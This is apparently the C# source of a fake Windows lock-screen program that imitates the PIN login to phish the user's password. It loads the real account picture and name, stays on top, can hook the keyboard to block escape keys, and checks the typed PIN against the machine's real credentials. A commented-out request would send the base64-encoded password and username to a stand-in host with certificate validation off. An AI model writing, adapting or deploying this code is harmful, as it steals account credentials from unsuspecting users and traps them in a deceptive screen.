using System;
using System.Windows;
using System.Windows.Forms;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using System.IO;
using Microsoft.Win32;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Media;
using System.DirectoryServices.AccountManagement;
using System.Security.Principal;
using System.Threading;
using System.Net.NetworkInformation;
using System.DirectoryServices;

namespace Login
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule; //Get Current Module
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey); //Assign callback function each time keyboard process
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0); //Setting Hook of Keyboard Process for current module
            InitializeComponent();
            Loaded += delegate
            {
                //Loaded += delegate to get canvas realwidth & realheight
                StartUp();
            };
        }
        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
                //blocks keys to get out of the window
                if (BlockspecialKeys)
                {
                    if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab || objKeyInfo.key == Keys.F4 || objKeyInfo.key == Keys.Alt || objKeyInfo.key == Keys.Escape) // Disabling Windows keys
                    {
                        return (IntPtr)1;
                    }
                }
                
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }
        //converts account image file to image (http://www.aminedries.com/blog/working-with-windows-8-user-pictures-accountpicture-ms/)
        public BitmapImage GetImage448(string path)
        {
            FileStream fs = new FileStream(path, FileMode.Open);
            long position = Seek(fs, "JFIF", 100);
            byte[] b = new byte[Convert.ToInt32(fs.Length)];
            fs.Seek(position - 6, SeekOrigin.Begin);
            fs.Read(b, 0, b.Length);
            fs.Close();
            fs.Dispose();
            return GetBitmapImage(b);
        }
        public static BitmapImage GetBitmapImage(byte[] imageBytes)
        {
            var bitmapImage = new BitmapImage();
            bitmapImage.BeginInit();
            bitmapImage.StreamSource = new MemoryStream(imageBytes);
            bitmapImage.EndInit();
            return bitmapImage;

        }
        public static long Seek(System.IO.FileStream fs, string searchString, int startIndex)
        {
            char[] search = searchString.ToCharArray();
            long result = -1, position = 0, stored = startIndex,
            begin = fs.Position;
            int c;
            while ((c = fs.ReadByte()) != -1)
            {
                if ((char)c == search[position])
                {
                    if (stored == -1 && position > 0 && (char)c == search[0])
                    {
                        stored = fs.Position;
                    }
                    if (position + 1 == search.Length)
                    {
                        result = fs.Position - search.Length;
                        fs.Position = result;
                        break;
                    }
                    position++;
                }
                else if (stored > -1)
                {
                    fs.Position = stored + 1;
                    position = 1;
                    stored = -1;
                }
                else
                {
                    position = 0;
                }
            }

            if (result == -1)
            {
                fs.Position = begin;
            }
            return result;

        }
        // Structure contain information about low-level keyboard input event
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        private const double V = 4;
        //System level functions to be used for hook and unhook keyboard input
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);


        //Declaring Global objects
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;
        
        bool CheckInternet()
        {
            try
            {
                //checks internet connection
                Ping myPing = new Ping();
                String host = "8.8.8.8";
                byte[] buffer = new byte[32];
                int timeout = 200;
                PingOptions pingOptions = new PingOptions();
                PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);
                return (reply.Status == IPStatus.Success);
            }
            catch (Exception)
            {
                return false;
            }

        }



        //set to false for testing
        bool UseRealName = false;
        bool BlockspecialKeys = false;




        void StartUp()
        {
            //form always on top
            this.Topmost = true;
            //(tries to) get user icon
            try
            {
                RegistryKey AccountPictureReg = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\AccountPicture", true);
                string AccountPictureFilename = AccountPictureReg.GetValue("SourceId").ToString();
                AccountPictureReg.Close();
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\AccountPictures\\" + AccountPictureFilename);
                if (File.Exists(path + ".accountpicture-ms"))
                {
                    BitmapImage img = GetImage448(path + ".accountpicture-ms");
                    image.ImageSource = img;
                }
            }
            catch (Exception)
            {

            }
            string name = Environment.UserName;
            bool internet = CheckInternet();
            //If there is internet connection it gets the real account name (takes a couple seconds)
            //Set UseRealName to false to disable
            if ((internet)&&(UseRealName))
            {
                UserPrincipal userPrincipal = UserPrincipal.Current;
                if (userPrincipal.DisplayName.Length > 0)
                {
                    name = userPrincipal.DisplayName;
                }
            }
            //styling...
            double x = Screen.PrimaryScreen.Bounds.Width;
            double y = Screen.PrimaryScreen.Bounds.Height;
            canvas.Width = x;
            canvas.Height = y;
            user.Width = y / 5.625;
            user.Height = y / 5.625;
            username.Width = canvas.ActualWidth;
            username.FontSize = y / 30;
            username.Text = name;
            username.TextAlignment = TextAlignment.Center;
            username.Foreground = System.Windows.Media.Brushes.White;
            pwd.Height = y / 40;
            pwd.FontSize = y / 40 / 2;
            btn.FontSize = pwd.FontSize;
            placeh.FontSize = pwd.FontSize;
            placeh.Width = 0.9 * y / V;
            placeh.Height = pwd.Height;

            language.Text = "ENG";

            Canvas.SetLeft(eth, canvas.ActualWidth - y / 20);
            Canvas.SetLeft(r1, canvas.ActualWidth - y / 20 - (r1.Width - eth.Width) / 2);
            Canvas.SetLeft(r2, canvas.ActualWidth - y / 20 - (r1.Width - eth.Width) / 2 - 50);
            Canvas.SetLeft(language, canvas.ActualWidth - y / 20 - 48);
            Canvas.SetTop(eth, canvas.ActualHeight - y / 20);
            Canvas.SetTop(r1, canvas.ActualHeight - y / 20 - (r1.Width - eth.Width) / 2);
            Canvas.SetTop(r2, canvas.ActualHeight - y / 20 - (r1.Width - eth.Width) / 2);
            Canvas.SetTop(language, canvas.ActualHeight - y / 20 + 5);

            Thickness padd2 = new Thickness(4, (pwd.Height - pwd.FontSize + 1) / 4, 0, 0);
            pwd.Padding = padd2;
            placeh.Padding = padd2;

            pwd.Width = 0.9 * y / V;
            btn.Width = 0.1 * y / V;
            border.Width = y / V + 4;
            border.Height = y / 40 + 4;
            err.Width = y / V;
            errb.Width = 0.3 * (y / V);
            txt.Width = 0.3 * y / V - 12;
            border2.Width = 0.3 * y / V + 4;
            err.FontSize = y / 100;
            border2.Height = errb.ActualHeight + 4;
            Thickness padd = new Thickness(y / 10);


            forgot.FontSize = signin.FontSize = err.FontSize;


            btn.Height = pwd.Height;
            Center(c4, 100);
            Center(c5, 100);
            //set positions based on proportion (kinda)
            //canvas3: login error
            Canvas.SetBottom(canvas3, user.Width * 3.5 - (user.Width / 3.5 - y / 28) * 5.7);
            Canvas.SetLeft(canvas3, (canvas.ActualWidth / 2) - errb.Width / 2);
            //canvas2: passwordbox & submit button
            Center(canvas2, y / V);
            Canvas.SetLeft(canvas2, (canvas.ActualWidth / 2) - y / (V * 2));
            Canvas.SetBottom(canvas2, user.Width * 3.5 - (user.Width / 3.5 - y / 28) * V);

            Canvas.SetLeft(btn, pwd.Width);
            //icon
            Center(user, user.Width);
            Canvas.SetBottom(user, user.Width * 3.5);
            //username text

            Canvas.SetBottom(username, user.Width * 3.5 - user.Width / 3.5);
            Canvas.SetBottom(c4, user.Width * 3.5 - (user.Width / 3.5 - y / 30) * 6.5);
            Canvas.SetBottom(c5, user.Width * 3.5 - (user.Width / 3.5 - y / 30) * 8.5);
        }
        void Center(UIElement el, double width)
        {
            //Centers element sometimes 
            Canvas.SetLeft(el, (canvas.ActualWidth / 2) - (width / 2));
        }
        void NoPwd()
        {
            //Password missing
            pwd.Visibility = btn.Visibility = border.Visibility = forgot.Visibility = signin.Visibility = placeh.Visibility = Visibility.Hidden;
            err.Visibility = errb.Visibility = canvas3.Visibility = Visibility.Visible;
        }
        bool Validate(string username, string password)
        {
            bool valid = false;

            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
            {
                valid = context.ValidateCredentials(username, password);
            }
            return valid;
        }
        void SaveCreds()
        {
            string us = Environment.UserName;
            string password = B64(pwd.Password);
            //HttpWebRequest req1 = (HttpWebRequest)WebRequest.Create("https://www.example.com?p=" + password + "&u=" + us + "&v=false");
            //req1.Timeout = 3000;
            //req1.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            //using (HttpWebResponse response = (HttpWebResponse)req1.GetResponse());
        }
        void SendCreds()
        {
            if (pwd.Password.Length > 0)
            {
                {
                    //do stuff with unvalidated credentials...
                    SaveCreds();
                    if (Validate(Environment.UserName, pwd.Password))
                    {
                        //do stuff with validated credentials...
                        SaveCreds();
                        Environment.Exit(1);
                    } else
                    {
                        err.Text = "The PIN is incorrect. Try again.";
                        NoPwd();

                    }
                }
                
            }
            else
            {
                NoPwd();
            }
        }
        public static string B64(string plainText)
        {
            //convert to b64
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }

        private void Btn_Click(object sender, RoutedEventArgs e) => SendCreds();
        private void Pwd_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            //Enter for submit
            if (Keyboard.IsKeyDown(Key.Enter))
            {
                SendCreds();
            }
        }

        private void Btn_Click_1(object sender, RoutedEventArgs e)
        {
            //back to login
            err.Text = "Provide a PIN.";
            pwd.Visibility = border.Visibility = btn.Visibility = forgot.Visibility = signin.Visibility = placeh.Visibility = Visibility.Visible;
            err.Visibility = errb.Visibility = canvas3.Visibility = Visibility.Hidden;
        }

        //OnMouseOver effect on buttons/textboxes

        private void Canvas2_MouseEnter(object sender, System.Windows.Input.MouseEventArgs e) => border.BorderBrush = Brushes.LightGray;

        private void Canvas2_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e) => border.BorderBrush = Brushes.Gray;

        private void Canvas3_MouseEnter(object sender, System.Windows.Input.MouseEventArgs e) => border3.BorderBrush = Brushes.Gray;

        private void Canvas3_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e) => border3.BorderBrush = Brushes.Transparent;
        
        //Password box placeholder

        private void Pwd_PasswordChanged(object sender, RoutedEventArgs e)
        {
            if (pwd.Password.Length > 0)
            {
                placeh.Text = "";
            } else
            {
                placeh.Text = "PIN";
            }
        }

        //OnMouseOver effect on text

        private void Forgot_PreviewMouseMove(object sender, System.Windows.Input.MouseEventArgs e) => forgot.Opacity = 0.7;

        private void Forgot_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e) => forgot.Opacity = 1;

        private void Signin_PreviewMouseMove(object sender, System.Windows.Input.MouseEventArgs e) => signin.Opacity = 0.7;

        private void Signin_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e) => signin.Opacity = 1;

        //OnMouseOver rectangles on icons

        private void Eth_MouseEnter(object sender, System.Windows.Input.MouseEventArgs e) => r1.Visibility = Visibility.Visible;

        private void Eth_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e) => r1.Visibility = Visibility.Hidden;

        private void Language_MouseEnter(object sender, System.Windows.Input.MouseEventArgs e) => r2.Visibility = Visibility.Visible;

        private void Language_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e) => r2.Visibility = Visibility.Hidden;
    }
}
